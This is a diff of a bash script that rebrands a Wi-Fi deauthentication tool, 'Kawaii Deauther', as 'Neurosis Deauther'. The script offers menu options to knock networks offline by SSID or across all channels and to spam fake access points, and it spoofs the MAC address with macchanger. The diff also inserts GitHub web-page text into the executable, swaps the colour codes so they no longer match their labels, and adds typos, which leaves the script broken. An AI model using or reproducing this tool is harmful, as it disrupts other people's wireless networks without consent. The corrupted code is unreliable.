@@ -1,19 +1,51 @@
+Skip to content
+Search or jump to…
+
+Pull requests
+Issues
+Marketplace
+Explore
+ 
+@ 
+avatar721
+/
+Neurosis Deauther
+18
+30363
+Code
+Issues
+3
+Pull requests
+Actions
+Projects
+Wiki
+Security
+Insights
+Neurosis Deauther/Neurosis Deauther.sh
+@avatar721
+avatar721 Neurosis v1.2
+Latest commit 7b27f4e on Jan 29, 2020
+ History
+ 1 contributor
+Executable File  228 lines (211 sloc)  7.35 KB
+  
 #!/bin/bash
 
-# Name: Kawaii Deauther
-# Author: Arya Narotama (4WSec)
-# Github: github.com/aryanrtm
-# Instagram: instagram.com/aryanrtm_
+# Name: Neurosis Deauther
+# Team: Cyber Kings Staff
+# Author: avatar721 (Neurosis)
+# Github: github.com/avatar721
+# Instagram: instagram.com/aryanwahid9
 # Give me the credits if you recode this tool. Don't be a SKID!
-# Kawaii Deauther is made with <3 by Arya Narotama - Anon Cyber Team - 2020
+# Neurosis Deauther is made with <3 by Arya Narotama - Anon Cyber Team - 2020
 
 
 ### Colors ###
-BK=$(tput setaf 0) # Black
-GR=$(tput setaf 2) # Green
-RD=$(tput setaf 1) # Red
-YW=$(tput setaf 3) # Yellow
-CY=$(tput setaf 6) # Cyan
+GR=$(tput setaf 0) # Green
+RD=$(tput setaf 2) # Red
+CY=$(tput setaf 1) # Cyan
+BK=$(tput setaf 3) # Black
+YW=$(tput setaf 6) # Yellow
 WH=$(tput setaf 7) # White
 NT=$(tput sgr0) # Netral
 BD=$(tput bold) # Bold
@@ -24,7 +56,7 @@ BG=$(tput setab 4) # Background Color
 function chk_root () {
 	if [[ "$(id -u)" -ne 0 ]]; then
 		banner
-		printf " ${BD}${WH}[${RD}!${WH}] ${RD}KawaiiDeauther must be run as root ${YW}｡ﾟ･（>﹏<）･ﾟ｡\n"
+		printf " ${BD}${WH}[${RD}!${WH}] ${RD}Neurosis Deauther must be run as root ${YW}｡ﾟ･（>﹏<）･ﾟ｡\n"
 		exit 1
 	fi
 }
@@ -32,23 +64,21 @@ function chk_root () {
 # Function for displaying banner
 function banner () {
 	printf "${BD}
-${GR}┊┊                  ${WH}╭━━━━━━
-${GR}┊┊┊┊${YW}╭━╱▔▔▔╲━╮${GR}┊┊${YW}☼   ${WH}╭╯${RD}KAWAII
+${GR}┊┊                  ${GR}╭━━━━━━
+${GR}┊┊┊┊${YW}╭━╱▔▔▔╲━╮${GR}┊┊${YW}☼   ${WH}╭╯${RD}NEUROSIS
 ${GR}┊╱╲┊${YW}╰▏▆┊┊┊▇▕╯${GR}╱╲┊   ${WH}┃${RD}DEAUTHER ${NT}${CY}v1.2${BD}
-${GR}▔▔▔▔▔${YW}▏┊┊▇┊┊▕${GR}▔▔▔▔   ${WH}╰┳━━━━━━
+${GR}▔▔▔▔▔${YW}▏┊┊▇┊┊▕${GR}▔▔▔▔   ${BK}╰┳━━━━━━
 ${GR}┈${YW}╱▔▔╱┊┊━┻━┊┊╲▔▔╲  ${WH}━━╯${YW}
-${GR}┈${YW}╲▂╱╭━━╮┊╭━━╮╲▂╱
-${GR}┈┈${YW}▔▔╰┻┻╯▔╰┻┻╯▔▔${GR}┈┈ ${RD}© 4WSec - 2020
-
- ${NT}${WH}[${RD}!${WH}] I am not responsible for damage caused by ${BD}${GR}Kawaii Deauther${WH}${NT}.
+${GR}┈${bk}╲▂╱╭━━╮┊╭━━╮╲▂╱
+${GR}┈┈${RD}▔▔╰┻┻╯▔╰┻┻╯▔▔${GR}┈┈ ${RD}© aryanwahid9 - 2020
+ ${NT}${WH}[${RD}!${WH}] I am not responsible for damage caused by ${BD}${GR}Neurosis Deauther${WH}${NT}.
      Attacking targets without prior mutual consent is ${BD}${RD}illegal${NT}!${BD}
-
 "
 }
 
 function banner_2 () {
 	printf "
-${BD}${RD}
+${BD}${GR}
 \t@@@@@                                        @@@@@
 \t@@@@@@@                                      @@@@@@@
 \t@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
@@ -61,15 +91,13 @@ ${BD}${RD}
 \t            @@@@@@      @@@@      @@@@@
 \t             @@@@@@    @@@@@@    @@@@@
 \t               @@@@@@@@@@  @@@@@@@@@
-\t           @@@@  @@@@ ${WH}@ @ @ @ ${RD}@@@@  @@@@
-\t          @@@@@   @@@ ${WH}@ @ @ @ ${RD}@@@   @@@@@
+\t           @@@@  @@@@ ${WH}@ @ @ @ ${GR}@@@@  @@@@
+\t          @@@@@   @@@ ${WH}@ @ @ @ ${GR}@@@   @@@@@
 \t        @@@@@      @@@@@@@@@@@@@      @@@@@
 \t      @@@@          @@@@@@@@@@@          @@@@
 \t   @@@@@              @@@@@@@              @@@@@
 \t  @@@@@@@                                 @@@@@@@
 \t   @@@@@                                   @@@@@
-
-
 "
 }
 
@@ -83,7 +111,7 @@ function get_interface () {
 		printf "${WH}%s) ${GR}%s\n" $con $x
 		let con++
 	done
-	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read iface
+	echo -ne "\n${RD}aryan${GR}@${RD}Neurosis: ${WH}>> "; read iface
 	selected_interface=$(sed ''$iface'q;d' .iface.tmp)
 	IFS=$'\n'
 }
@@ -137,21 +165,21 @@ banner
 printf " ${WH}1) ${GR}Takedown with SSID\n"
 printf " ${WH}2) ${GR}Takedown all channels\n"
 printf " ${WH}3) ${GR}Spam many fake AP\n"
-printf " ${WH}4) ${GR}Exit\n"
-echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read attack
+printf " ${WH}4) ${RD}Exit\n"
+echo -ne "\n${RD}aryan${GR}@${RD}Neurosis: ${WH}>> "; read attack
 clear
 
 if [[ $attack == 1 ]]; then
 	banner
 	printf "${NT}\n"
 	nmcli dev wifi
-	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read attck_ssid
+	echo -ne "\n${RD}aryan${GR}@${RD}Neurosis: ${WH}>> "; read attck_ssid
 	clear
 	banner
 	get_interface
 	clear
 	banner_2
-	printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
+	printf "                         ${WH}[ ${GR}Neurosis Deauther ${WH}]\n"
 	printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
 	monitor_mode >> /dev/null 2>&1
 	trap deactivate_destruction EXIT ### CTRL+C to exit
@@ -160,13 +188,13 @@ elif [[ $attack == 2 ]]; then
 	banner
 	printf "${NT}\n"
 	nmcli dev wifi
-	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read attck_chnl
+	echo -ne "\n${RD}aryan${GR}@${RD}KNeurosis: ${WH}>> "; read attck_chnl
 	clear
 	banner
 	get_interface
 	clear
 	banner_2
-	printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
+	printf "                         ${WH}[ ${GR}Neurosis Deauther ${WH}]\n"
 	printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
 	monitor_mode >> /dev/null 2>&1
 	trap deactivate_destruction EXIT ### CTRL+C to exit
@@ -178,14 +206,14 @@ elif [[ $attack == 3 ]]; then
 	banner
 	printf "${WH}1) ${GR}Use default wordlist\n"
 	printf "${WH}2) ${GR}Use custom wordlist\n"
-	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read spm
+	echo -ne "\n${RD}aryan${GR}@${RD}Neurosis: ${WH}>> "; read spm
 	if [[ $spm == 1 ]]; then
 		nmcli device disconnect $selected_interface >> /dev/null 2>&1
 		clear
 		banner_2
 		trap deactivate_destruction_2 EXIT ### CTRL+C to exit
 		sleep 2
-		printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
+		printf "                         ${WH}[ ${GR}Neurosis Deauther ${WH}]\n"
 		printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
 		ifconfig $selected_interface down
 		macchanger -r $selected_interface >> /dev/null 2>&1
@@ -198,8 +226,8 @@ elif [[ $attack == 3 ]]; then
 		nmcli device disconnect $AD > /dev/null 2>&1
 		clear
 		banner
-		printf "\n${RD}4WSec${GR}@${RD}Kawaii${WH}(SSID(Name of Network)) >> "; read rand_ssid;
-		printf "\n${RD}4WSec${GR}@${RD}Kawaii${WH}(How Many SSID) >> "; read con_ssid;
+		printf "\n${RD}aryan${GR}@${RD}Neurosis${WH}(SSID(Name of Network)) >> "; read rand_ssid;
+		printf "\n${RD}aryan${GR}@${RD}Neurosis${WH}(How Many SSID) >> "; read con_ssid;
 		for x in $(seq 1 $con_ssid); do
 			echo "$rand_ssid $x" >> $rand_ssid"_list.txt"
 		done
@@ -208,7 +236,7 @@ elif [[ $attack == 3 ]]; then
 		banner_2
 		trap deactivate_destruction_2 EXIT ### CTRL+C to exit
 		sleep 2
-		printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
+		printf "                         ${WH}[ ${GR}Neurosis Deauther ${WH}]\n"
 		printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
 		ifconfig $selected_interface down
 		macchanger -r $selected_interface >> /dev/null 2>&1
